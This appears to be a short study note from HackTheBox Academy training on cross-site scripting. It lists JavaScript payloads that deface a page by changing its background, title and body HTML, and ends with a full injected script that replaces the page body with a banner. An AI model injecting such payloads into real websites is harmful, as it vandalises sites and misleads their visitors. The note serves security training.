#### Defacing

HTML elements:
- document.body.style.background
	- <script>document.body.style.background = "#141d2b"</script>
- document.body.background
	- <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
- document.title
	- <script>document.title = 'HackTheBox Academy'</script>
- DOM.innerHTML
	- document.getElementById("todo").innerHTML = "New Text"
	- $("#todo").html('New Text');
	- document.getElementsByTagName('body')[0].innerHTML = "New Text"

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

